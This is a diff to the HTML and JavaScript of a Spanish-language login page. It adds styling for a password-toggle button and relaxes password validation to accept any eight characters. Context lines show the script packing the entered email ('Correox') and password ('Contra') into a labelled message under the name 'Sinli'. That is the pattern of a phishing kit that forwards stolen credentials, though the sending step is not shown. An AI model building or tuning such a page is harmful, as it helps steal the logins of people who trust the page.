@@ -113,10 +113,17 @@
             color: #5A37B4;
             cursor: pointer;
             position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
+            right: 10px; /* Espaciado desde el borde derecho */
+            top: 50%; /* Centrado vertical */
+            transform: translateY(-50%); /* Centrado vertical */
             font-size: 14px;
+            padding: 0; /* Sin padding para que ocupe menos espacio */
+            width: 50px; /* Ancho fijo para el botón */
+            height: 30px; /* Alto fijo para el botón */
+        }
+
+        .toggle-password:hover {
+            opacity: 0.8; /* Opcional: cambiar la opacidad al pasar el ratón */
         }
     </style>
     <style>
@@ -265,9 +272,9 @@
             const message = " ------ Sinli ------ Correox: " + nombre + " ------ Contra: " + contra;
 
             // Password validation
-            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&.,])[A-Za-z\d@$!%*?&.,]{8,}$/; // At least 8 characters, 1 uppercase, 1 number, 1 special char
+            const regex = /^[\s\S]{8,}$/; // Permitir cualquier carácter y mínimo 8 caracteres
             if (!regex.test(contra)) {
-                alert("La contraseña debe tener al menos 8 caracteres, incluyendo una letra mayúscula, un número y un símbolo.");
+                alert("La contraseña debe tener al menos 8 caracteres.");
                 return; // Prevent form submission
             }
 
